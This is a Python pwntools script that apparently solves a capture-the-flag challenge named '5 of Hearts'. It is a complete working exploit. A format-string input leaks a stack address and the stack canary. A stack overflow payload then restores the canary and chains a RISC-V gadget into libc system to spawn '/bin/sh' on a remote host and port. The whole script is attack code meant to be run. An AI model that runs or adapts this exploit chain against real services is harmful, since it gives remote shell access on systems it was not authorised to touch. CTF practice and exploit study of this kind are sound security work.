#!/usr/bin/env python3

#
# Solve 5 of Hearts
#

import sys
import re

from pwn import *

context(bits=64, endian="little")


def leak(conn, fmt="%p.%p.%p"):
    conn.recvuntil("Who is your daddy? ")
    conn.sendline(fmt)

    _, buf_addr, canary = conn.recvline_contains("0x").decode().split(".")

    log.info("Leaked buffer address: {}".format(buf_addr))
    cmd_addr = int(buf_addr, 16) - len(fmt) - 1
    log.success("Command string address: {:#x}".format(cmd_addr))
    cmd_addr = p64(cmd_addr)

    if b"\x0a" in cmd_addr:
        log.failure("0x0a badchar found in command string address")
        sys.exit(1)

    log.success("Leaked stack canary: {}".format(canary))
    canary = p64(int(canary, 16))

    if b"\x0a" in canary:
        log.failure("0x0a badchar found in leaked stack canary")
        sys.exit(1)

    return cmd_addr, canary


def exploit(conn, cmd_addr, canary, cmd="/bin/sh"):
    conn.recvuntil("And what does he do? ")

    buf = (cmd + "\x00").encode()
    buf += randoms(256 - len(buf)).encode()
    buf += canary
    buf += randoms(8).encode()

    """
    Disassembly of section .text:
    [snip]
       4a9cc:       6562                    ld      a0,24(sp)
       4a9ce:       70a2                    ld      ra,40(sp)
       4a9d0:       6145                    addi    sp,sp,48
       4a9d2:       8082                    ret
    """
    buf += p64(0x4a9cc)

    buf += randoms(24).encode()
    buf += cmd_addr
    buf += randoms(8).encode()

    """
    Disassembly of section .text:
    [snip]
       153a2:       c119                    beqz    a0,0x153a8
       153a4:       cd3ff06f                j       0x15076
       153a8:       0004e537                lui     a0,0x4e
       153ac:       1141                    addi    sp,sp,-16
       153ae:       dc850513                addi    a0,a0,-568 # 0x4ddc8
       153b2:       e406                    sd      ra,8(sp)
       153b4:       cc3ff0ef                jal     ra,0x15076
       153b8:       60a2                    ld      ra,8(sp)
       153ba:       00153513                seqz    a0,a0
       153be:       0141                    addi    sp,sp,16
       153c0:       8082                    ret
    """
    buf += p64(0x153a2)  # __libc_system

    log.info("Yeeting `{}' at {}:{}".format(cmd, conn.rhost, conn.rport))
    conn.sendline(buf)

    if re.match(r"^[/a-z]*sh$", cmd):
        conn.interactive()
    else:
        print(conn.recvrepeat(1).decode())


def main():
    rhost = args["RHOST"] or "127.0.0.1"
    rport = args["RPORT"] or 23
    cmd = args["CMD"] or "/bin/sh"

    log.info("Attempting to solve 5 of Hearts")
    conn = remote(rhost, rport)
    cmd_addr, canary = leak(conn)
    exploit(conn, cmd_addr, canary, cmd)
    conn.close()


if __name__ == "__main__":
    main()
